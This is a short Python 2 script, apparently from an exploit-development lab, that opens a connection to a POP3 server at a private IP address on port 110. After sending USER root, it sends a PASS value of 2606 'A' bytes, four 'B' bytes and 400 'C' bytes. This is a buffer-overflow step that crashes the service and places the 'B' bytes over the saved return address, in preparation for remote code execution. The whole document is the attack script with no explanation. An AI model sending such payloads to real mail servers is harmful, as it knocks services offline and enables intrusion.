#!/usr/bin/python	
  
import socket	
 	
buffer=["A"]	
  
counter=100	
  
string="A"*2606 + "B"*4 +"C"*400
	
if 1:	
   print"Fuzzing PASS with %s bytes" %	len(string)		
   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)	
   connect=s.connect(('192.168.250.136',110))	
   data=s.recv(1024)	
   #print str(data)
   s.send('USER root\r\n')		
   data=s.recv(1024)
   print str(data)	
   s.send('PASS	' + string + '\r\n')	
   data=s.recv(1024)
   print str(data)	
   print "done"
   #s.send('QUIT\r\n')		
   #s.close()	
  
